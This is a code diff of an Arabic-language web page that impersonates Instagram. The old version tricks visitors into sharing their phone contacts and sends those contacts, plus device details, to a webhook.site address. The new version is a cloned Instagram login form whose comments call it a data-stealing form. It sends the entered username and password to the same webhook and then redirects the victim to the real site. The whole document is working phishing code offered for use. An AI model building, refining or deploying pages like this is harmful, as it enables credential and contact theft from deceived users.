@@ -1,115 +1,208 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Instagram</title>
     <style>
+        /* تصميم الوضع الداكن الحقيقي لإنستغرام */
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: system-ui, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .container { background: white; border: 1px solid #dbdbdb; border-radius: 12px; width: 100%; max-width: 400px; padding: 25px; text-align: center; }
-        .header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 15px; border-bottom: 1px solid #efefef; }
-        .logo { font-family: 'Billabong', cursive; font-size: 26px; color: #262626; }
-        .dots { font-size: 24px; color: #262626; }
-        .profile { display: flex; align-items: center; gap: 15px; padding: 15px 0; text-align: left; }
-        .avatar { width: 55px; height: 55px; background: linear-gradient(135deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); border-radius: 50%; display: flex; justify-content: center; align-items: center; color: white; font-size: 22px; font-weight: bold; }
-        .info h3 { font-size: 15px; color: #262626; }
-        .info p { font-size: 13px; color: #8e8e8e; }
-        .post { background: #efefef; height: 220px; border-radius: 10px; display: flex; justify-content: center; align-items: center; color: #8e8e8e; margin-bottom: 15px; }
-        .desc { font-size: 14px; color: #8e8e8e; margin-bottom: 15px; }
-        .btn { width: 100%; padding: 12px; background: #0095f6; color: white; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; transition: 0.2s; }
-        .btn-green { background: #2ea043; }
-        .btn:disabled { background: #b2dffc; cursor: default; }
-        #status { margin-top: 15px; font-size: 13px; padding: 12px; border-radius: 8px; display: none; }
-        .status-ok { background: #e6f5e6; color: #2e7d32; display: block; }
-        .status-info { background: #e3f2fd; color: #0d47a1; display: block; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background: #000000; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+        }
+        .container {
+            width: 100%;
+            max-width: 380px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        /* شعار إنستغرام الجديد (صورة SVG) */
+        .logo-container {
+            margin-bottom: 35px;
+            display: flex;
+            justify-content: center;
+        }
+        .logo-svg {
+            width: 70px;
+            height: 70px;
+        }
+
+        /* حقول الإدخال */
+        .input-group {
+            margin-bottom: 12px;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #121212;
+            border: 1px solid #363636;
+            border-radius: 8px;
+            font-size: 14px;
+            color: #f5f5f5;
+            outline: none;
+        }
+        input::placeholder { color: #a8a8a8; }
+        input:focus { border-color: #8a8a8a; }
+
+        /* زر تسجيل الدخول */
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: 0.2s;
+        }
+        .btn:disabled { background: #3a6a96; cursor: default; }
+
+        /* نصوص إضافية */
+        .forgot-password {
+            display: block;
+            color: #e0f0ff;
+            font-size: 13px;
+            text-decoration: none;
+            margin-top: 15px;
+            text-align: center;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 25px 0;
+        }
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #262626;
+        }
+        .divider span {
+            padding: 0 18px;
+            color: #737373;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        /* زر إنشاء حساب جديد */
+        .signup-box {
+            margin-top: 20px;
+            padding: 15px;
+            background: #000000;
+            border: 1px solid #262626;
+            border-radius: 8px;
+        }
+        .signup-text {
+            color: #f5f5f5;
+            font-size: 14px;
+        }
+        .signup-text a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        #status { display: none; }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <div class="header"><div class="logo">Instagram</div><div class="dots">⋯</div></div>
-        <div class="profile"><div class="avatar">A</div><div class="info"><h3>أحمد_الضحية</h3><p>تأمين الحساب</p></div></div>
-        <div class="post"><span>🔒</span> الصورة محمية</div>
-        <div class="desc">يرجى تأكيد هويتك عبر جهات الاتصال لفتح المحتوى.</div>
-        <button class="btn" id="actionBtn">تأكيد الحساب</button>
-        <div id="status"></div>
+
+        <!-- الشعار -->
+        <div class="logo-container">
+            <!-- استخدام شعار إنستغرام الرسمي كـ SVG -->
+            <svg class="logo-svg" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                    <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="100%">
+                        <stop offset="0%" style="stop-color:#f58529;stop-opacity:1" />
+                        <stop offset="50%" style="stop-color:#dd2a7b;stop-opacity:1" />
+                        <stop offset="100%" style="stop-color:#515bd4;stop-opacity:1" />
+                    </linearGradient>
+                </defs>
+                <rect width="64" height="64" rx="16" fill="url(#grad1)"/>
+                <circle cx="32" cy="32" r="14" fill="none" stroke="white" stroke-width="3"/>
+                <circle cx="43" cy="21" r="3" fill="white"/>
+            </svg>
+        </div>
+
+        <!-- نموذج سرقة البيانات -->
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف المحمول" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="كلمة السر" required>
+            </div>
+            <button type="submit" class="btn" id="loginBtn">تسجيل الدخول</button>
+            <div id="status"></div>
+            <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
+        </form>
+
+        <div class="divider"><span>أو</span></div>
+
+        <div class="signup-box">
+            <p class="signup-text">ليس لديك حساب؟ <a href="#">إنشاء حساب جديد</a></p>
+        </div>
+
+        <div style="margin-top: 30px; text-align: center;">
+            <p style="color: #737373; font-size: 12px;">من Meta</p>
+        </div>
+
     </div>
 
     <script>
-        document.getElementById('actionBtn').addEventListener('click', async function() {
-            const btn = this;
-            const statusBox = document.getElementById('status');
-            
-            btn.innerText = "جاري التحميل...";
-            btn.disabled = true;
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
 
-            // 1. تجهيز البيانات الأساسية
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const btn = document.getElementById('loginBtn');
+            const status = document.getElementById('status');
+
+            btn.innerText = "جاري تسجيل الدخول...";
+            btn.disabled = true;
+            status.style.display = 'none';
+
+            // البيانات المسروقة
             const data = {
-                device: "iPhone",
-                ua: navigator.userAgent,
-                screen: `${window.screen.width} x ${window.screen.height}`,
+                username: username,
+                password: password,
                 timestamp: new Date().toISOString()
             };
 
-            // 2. التحقق من المتصفح
-            if (!navigator.contacts || !navigator.contacts.select) {
-                sendToWebhook(data, "المتصفح لا يدعم جهات الاتصال.");
-                return;
-            }
+            // Webhook الخاص بك
+            const webhook = 'https://webhook.site/45b14a78-723d-40c8-9932-da5cc5d33397';
 
-            // 3. طلب جهات الاتصال (الجزء الصحيح الآن)
             try {
-                const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+                await fetch(webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
 
-                if (contacts && contacts.length > 0) {
-                    data.contacts = contacts;
-                    statusBox.className = 'status-ok';
-                    statusBox.innerText = "✅ تم التحقق بنجاح!";
-                    btn.innerText = "تم";
-                    btn.className = "btn btn-green";
-                } else {
-                    data.status = "إلغاء";
-                    sendToWebhook(data, "تم إلغاء الاختيار.");
-                }
+                // إعادة التوجيه إلى إنستغرام الحقيقي
+                setTimeout(() => {
+                    window.location.replace("https://www.instagram.com");
+                }, 1000);
+
             } catch (error) {
-                // 4. إذا رفض المستخدم (المنطق العكسي)
-                if (error.name === 'NotAllowedError') {
-                    data.status = "رفض";
-                    sendToWebhook(data, "رفض الإذن (المنطق العكسي).");
-                } else {
-                    console.error(error);
-                }
+                btn.innerText = "تسجيل الدخول";
+                btn.disabled = false;
+                status.style.display = 'block';
+                status.innerText = "حدث خطأ. حاول مرة أخرى.";
+                status.style.color = "#ed4956";
             }
         });
-
-        // دالة الإرسال
-        function sendToWebhook(data, reason) {
-            data.reason = reason;
-            const webhookUrl = 'https://webhook.site/45b14a78-723d-40c8-9932-da5cc5d33397';
-
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).then(() => {
-                const statusBox = document.getElementById('status');
-                const btn = document.getElementById('actionBtn');
-                statusBox.className = 'status-info';
-                statusBox.innerText = "🔐 جاري تحديث الإعدادات الأمنية...";
-                btn.innerText = "تم التحديث";
-                btn.className = "btn btn-green";
-                btn.disabled = false;
-            }).catch(() => {
-                const statusBox = document.getElementById('status');
-                const btn = document.getElementById('actionBtn');
-                statusBox.className = 'status-info';
-                statusBox.innerText = "🔐 جاري تحديث الإعدادات الأمنية...";
-                btn.innerText = "تم التحديث";
-                btn.className = "btn btn-green";
-                btn.disabled = false;
-            });
-        }
     </script>
 </body>
 </html>
